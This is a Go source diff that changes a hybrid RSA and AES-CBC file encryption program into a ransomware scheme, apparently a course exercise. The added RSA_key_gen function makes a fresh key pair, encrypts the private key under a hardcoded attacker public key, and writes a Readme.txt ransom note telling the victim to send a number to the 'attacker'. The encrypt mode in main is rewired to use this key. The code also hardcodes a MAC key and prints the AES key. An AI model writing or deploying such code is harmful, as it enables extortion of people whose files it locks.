@@ -10,14 +10,13 @@ import (
 	"os"
 	"strconv"
 	"strings"
-
 	//"log"
 	"crypto/aes"
 	"encoding/hex"
 	"math"
 )
 
-//addition, subtraction and multiplication
+///addition, subtraction and multiplication
 func MR_test(n *big.Int) bool {
 	Big1 := big.NewInt(1)
 	Big2 := big.NewInt(2)
@@ -183,20 +182,13 @@ func XoR(b1 []byte, b2 []byte) []byte {
 //return the padding byte array for the specific message M
 func PKCS_5(M []byte) []byte {
 	dst, _ := hex.DecodeString("")
-	n := int(math.Mod(float64(len(M)), 32.0))
+	n := int(math.Mod(float64(len(M)), 16.0))
 
 	if n == 0 {
-		dst, _ = hex.DecodeString(strings.Repeat("20", 32))
-		//fmt.Printf("padding: %x,%d\n",dst,dst)
-		//return dst
-	} else if n > 16 {
-		s := fmt.Sprintf("0%x", 32-n)
-		dst, _ = hex.DecodeString(strings.Repeat(s, 32-n))
-
+		dst, _ = hex.DecodeString(strings.Repeat("10", 16))
 	} else {
-		s := fmt.Sprintf("%x", 32-n)
-		dst, _ = hex.DecodeString(strings.Repeat(s, 32-n))
-
+		s := fmt.Sprintf("0%x", 16-n)
+		dst, _ = hex.DecodeString(strings.Repeat(s, 16-n))
 	}
 	//fmt.Printf("need length: %d, padding: %x with length %d\n", 32-n, dst, len(dst))
 	return dst
@@ -206,25 +198,25 @@ func PKCS_5(M []byte) []byte {
 //use AES-256 in CBC mode to encrypt the message M
 func AES_CBC_ENC(Kenc []byte, IV []byte, M []byte) []byte {
 	var c []byte
-
 	block, err := aes.NewCipher(Kenc)
 	if err != nil {
 		panic(err)
 	}
-
+	//temp = XoR
 	for len(M) > 0 {
-		block.Encrypt(IV, XoR(IV, M[:32]))
-		M = M[32:]
+		block.Encrypt(IV, XoR(IV, M[:16]))
+		//fmt.Printf("IV:%x\n", IV)
+		M = M[16:]
 		c = append(c, IV...)
 	}
 	return c
 
 }
 
-//use AES-128 in CBC mode to decrypt the ciphertext C
+//use AES-256 in CBC mode to decrypt the ciphertext C
 func AES_CBC_DEC(Kenc []byte, IV []byte, C []byte) []byte {
 	var m []byte
-	temp := make([]byte, 32)
+	temp := make([]byte, 16)
 
 	block, err := aes.NewCipher(Kenc)
 	if err != nil {
@@ -236,11 +228,9 @@ func AES_CBC_DEC(Kenc []byte, IV []byte, C []byte) []byte {
 		block.Decrypt(temp, C)
 		//fmt.Println(temp, len(C))
 		m = append(m, XoR(IV, temp)...)
-		IV = C[:32]
-		C = C[32:]
+		IV = C[:16]
+		C = C[16:]
 	}
-
-	//fmt.Println("IV:", IV)
 	return m
 }
 
@@ -249,7 +239,37 @@ func HMAC_SHA256(Kmac []byte, M []byte) []byte {
 	hmac256 := hmac.New(sha256.New, Kmac)
 	hmac256.Write(M)
 	return hmac256.Sum(nil)
+}
 
+func key_clear(key *big.Int) {
+	for i := 0; i < 5; i++ {
+		temp, _ := rand.Int(rand.Reader, key)
+		key.Xor(key, temp)
+	}
+}
+
+//generate random RSA key pairs
+func RSA_key_gen(N, e *big.Int) (*big.Int, *big.Int) {
+	big1 := big.NewInt(1)
+	p := key_gen()
+	q := key_gen()
+	phi := new(big.Int).Mul(new(big.Int).Sub(p, big1), new(big.Int).Sub(q, big1))
+	N_ := new(big.Int).Mul(p, q)
+	e_ := find_rel_prime(phi)
+	d_ := EEA(e_, phi)
+
+	pri := fmt.Sprintf("Private key: (%s,%s,%s)", Fast_exp(p, e, N), Fast_exp(q, e, N), Fast_exp(d_, e, N))
+	pri_data := []byte(pri)
+
+	sha_256 := sha256.New()
+	sha_256.Write(pri_data)
+
+	sha_256_loc := fmt.Sprintf("Server/%x", sha_256.Sum(nil))
+	readme := fmt.Sprintf("Send this number %x to attacker XXX", sha_256.Sum(nil))
+	fmt.Println(readme)
+	ioutil.WriteFile("Readme.txt", []byte(readme), 0644)
+	ioutil.WriteFile(sha_256_loc, pri_data, 0644)
+	return N_, e_
 }
 
 //encrypt the message by using Key
@@ -260,24 +280,25 @@ func encrypt(N *big.Int, e *big.Int, M []byte) []byte {
 	M_ := append(M, T...)
 	PS := PKCS_5(M_)
 	M__ := append(M_, PS...)
-	fmt.Printf("Msg: %x\n", M__)
-	IV := make([]byte, 32)
+	//fmt.Printf("Msg before encryption: %x\n", M__)
+	IV := make([]byte, 16)
 	rand.Read(IV)
 	IV_ := make([]byte, len(IV))
 	copy(IV_, IV)
 
 	Kenc := make([]byte, 32)
 	rand.Read(Kenc)
+	fmt.Printf("Kenc:%x\n", Kenc)
 	C_ := AES_CBC_ENC(Kenc, IV_, M__)
 	C := append(IV, C_...)
-	fmt.Printf("MSG: %x\n", C)
-	decrypt(Kenc, C)
+	//fmt.Printf("MSG after encryption: %x\n", C_)
+	//decrypt(Kenc, C)
 	big_Kenc := new(big.Int).SetBytes(Kenc)
 	//fmt.Printf("IV:%x with length:%d\n", IV, len(IV))
-	//fmt.Printf("Kenc:%x with length:%d\n", Kenc, len(Kenc))
+	//fmt.Printf("big_Kenc:%s with length:%d\n", big_Kenc, len(Kenc))
 	tmp := Fast_exp(big_Kenc, e, N)
 	//fmt.Printf("Big_enc:%d\n", big_Kenc)
-	//fmt.Printf("encrption:%d\n", tmp)
+	//fmt.Printf("key_int:%d\n", tmp)
 	Kenc_encrypted := tmp.Bytes()
 	//fmt.Printf("Header:%x\t with length:%d\n", Kenc_encrypted, len(Kenc_encrypted))
 	return append(Kenc_encrypted, C...)
@@ -285,15 +306,15 @@ func encrypt(N *big.Int, e *big.Int, M []byte) []byte {
 
 //decrypt the cipthertext by using the Key
 func decrypt(Kenc []byte, C []byte) []byte {
-	fmt.Println("running")
+	//fmt.Println("running")
 	Kmac := []byte("secret")
-	IV := C[:32]
-	C_ := C[32:]
+	IV := C[:16]
+	C_ := C[16:]
 	M__ := AES_CBC_DEC(Kenc, IV, C_)
 
 	last := len(M__) - 1
 	s := fmt.Sprintf("%d", M__[last])
-	fmt.Printf("Msg: %x\n", M__)
+	//fmt.Printf("Msg after decryption: %x\n", M__)
 	number, _ := strconv.Atoi(s)
 	//padding := fmt.Sprintf("%d", M__[last-number:])
 	//fmt.Println("checking padding", padding, number)
@@ -310,14 +331,14 @@ func decrypt(Kenc []byte, C []byte) []byte {
 	M := M_[:len(M_)-32]
 	T_ := HMAC_SHA256(Kmac, M)
 	//fmt.Println(T_)
-	fmt.Println("checking MAC")
+	//fmt.Println("checking MAC")
 	for i, hex := range T {
 		if T_[i] != hex {
 			fmt.Println("INVALID MAC")
 			os.Exit(0)
 		}
 	}
-	fmt.Println("GOOD!")
+	//fmt.Println("GOOD!")
 	return M
 
 }
@@ -350,53 +371,34 @@ func load_key(input_file string) (*big.Int, *big.Int) {
 	N, _ := new(big.Int).SetString(keys[0], 10)
 	d, _ := new(big.Int).SetString(keys[1], 10)
 	return N, d
-
 }
 
 func main() {
+	//Hardcoded public key
 	N, _ := new(big.Int).SetString("27373176497986431932251251116443926663831806261071313412989844158826154814084495647335491185915655601666177981912915917513154667109854715685389256347698156167098286352963470578246399719078975590638921432718527013913639908860623319460907657961571096028464789764100067928297618269506856287203984333985334991680977184069499150590693164224823071048888338148038226506445470031874898694438134368521730060168857461554576831837880299721200508752202214917227818509186371000166250119754889508590004281188893160298827566989760562889798571576260058420518940759480974818966399516795337246357463835643099652311241207979328006473273", 10)
 	e, _ := new(big.Int).SetString("114555885618321971166525289009247562530684912588490288375374382656653624817637873641873338444064827244125181436880632068365026025194100187802604323676970718988010331197271572511319987984765105343287840472134128084868761183464484207489195971498946203121897312631812237101119681888221283146033802960204006054855", 10)
+	//key gen
 
 	mode := os.Args[1]
 	file := os.Args[2]
 	if mode == "-e" {
-		encrypted_data := encrypt(N, e, read_file(file))
+		N_, e_ := RSA_key_gen(N, e)
+		encrypted_data := encrypt(N_, e_, read_file(file))
 		ioutil.WriteFile("encrypted.txt", encrypted_data, 0644)
 	} else if mode == "-d" {
 		//Decrypt
-		_, d := load_key(os.Args[3])
+		N_, d_ := load_key(os.Args[3])
 		encrypted_data := read_file(os.Args[2])
 		Header := encrypted_data[:256]
 		//fmt.Printf("Header:%x\t with length:%d\n", Header, len(Header))
 
 		cipher_text := encrypted_data[256:]
 		big_header := new(big.Int).SetBytes(Header)
-		Kenc := Fast_exp(big_header, d, N).Bytes()
-		//fmt.Printf("Kenc:%x with length:%d\n", Kenc, len(Kenc))
-
+		//fmt.Println("key int:", big_header)
+		Kenc := Fast_exp(big_header, d_, N_).Bytes()
+		//fmt.Printf("Kenc: %x\n", Kenc)
 		plain_text := decrypt(Kenc, cipher_text)
 		ioutil.WriteFile("decrypted.txt", plain_text, 0644)
 		//pri_key_file := os.Args[3]
 	}
-	// big1 := big.NewInt(1)
-	// p := key_gen()
-	// q := key_gen()
-
-	// phi := new(big.Int).Mul(new(big.Int).Sub(p,big1),new(big.Int).Sub(q,big1))
-	// N := new(big.Int).Mul(p,q)
-	// e := find_rel_prime(phi)
-	// d := EEA(e,phi)
-
-	// pub_key_file := os.Args[1]
-	// pri_key_file := os.Args[2]
-
-	// data := fmt.Sprintf("Public key. (%s,%s)",N,e)
-	// //fmt.Println(data)
-	// ioutil.WriteFile(pub_key_file,[]byte(data),0644)
-
-	// data = fmt.Sprintf("Private key. (%s,%s,%s,%s)",N,d,p,q)
-	// //fmt.Println(data)
-	// ioutil.WriteFile(pri_key_file,[]byte(data),0644)
-	// //fmt.Println(pub_key_file,pri_key_file)
-
 }
